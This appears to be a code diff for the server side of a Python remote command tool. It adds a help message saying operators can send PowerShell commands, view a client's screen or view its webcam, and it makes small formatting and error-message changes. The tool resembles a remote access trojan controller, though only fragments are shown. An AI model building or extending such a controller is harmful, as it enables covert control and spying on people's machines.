@@ -11,7 +11,7 @@ print(colorama.Fore.RED + "\nTCP_Server...\n")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 sett = {
-    "ip" : "127.0.0.1",
+    "ip"   : "127.0.0.1",
     "port" : "5050"
 }
 
@@ -76,6 +76,9 @@ def start_server():
 
                     if command == "exit":
                         break
+                    elif command == "help":
+                        print("u can use powershell commands or\n*viewscreen\n*viewcam")
+                        continue
 
                     data_client[int(con[1])][0].send(bytes(command, "utf-8"))
                     data_client[int(con[1])][0].settimeout(0.8)
@@ -87,7 +90,7 @@ def start_server():
                             break
 
                 except Exception as e:
-                    print(f"server Error: {e}")
+                    print(f"client Error: {e}")
         
         elif con[0] == "test":
             test_connections()
